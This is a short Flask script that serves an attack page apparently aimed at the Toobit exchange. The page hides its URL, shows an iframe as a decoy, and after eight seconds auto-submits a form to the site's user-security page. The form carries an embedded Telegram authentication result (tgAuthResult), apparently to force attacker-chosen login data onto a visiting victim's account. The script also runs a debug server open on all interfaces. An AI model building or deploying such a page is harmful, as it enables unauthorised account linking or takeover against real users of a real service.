from flask import Flask, render_template_string

app = Flask(__name__)

# ---- Config ----
BOT_ID = "7282074722"
ORIGIN = "https://www.toobit.com"
RETURN_TO = "https://www.toobit.com/en-US/user/security"
FORM2_HASH = "f98c0eedd778ceb1f9"

# HTML Template
PAGE = """
<!doctype html>
<html>
  <body>
    <iframe src="/static/imran.html" width="600" height="400" title="Contenu externe"></iframe>
    <form action="https://www.toobit.com/en-US/user/security#tgAuthResult=eyJpZCI6ODI1MDU4MDUwMiwiZmlyc3RfbmFtZSI6IlBvbGljZSIsImF1dGhfZGF0ZSI6MTc4NDExNTkyNCwiaGFzaCI6IjQxNjIwZjdhODZmMjFlNTIzNTU5N2RlNjNmZTU4NGM1ZjNmYjk1MDRmODVjYzYxODdjMGFlOGZjOGZhNWUyYTAifQ">
     
    </form>

    <script>
      history.pushState('', '', '/');
      setTimeout(function() {
        document.forms[0].submit();
      }, 8000);
    </script>
  </body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(
        PAGE,
        bot_id=BOT_ID,
        origin=ORIGIN,
        return_to=RETURN_TO,
        form2_hash=FORM2_HASH
    )

if __name__ == "__main__":
    # Setting debug=True helps auto-reload the server when files change
    app.run(host="0.0.0.0", port=5000, debug=True)
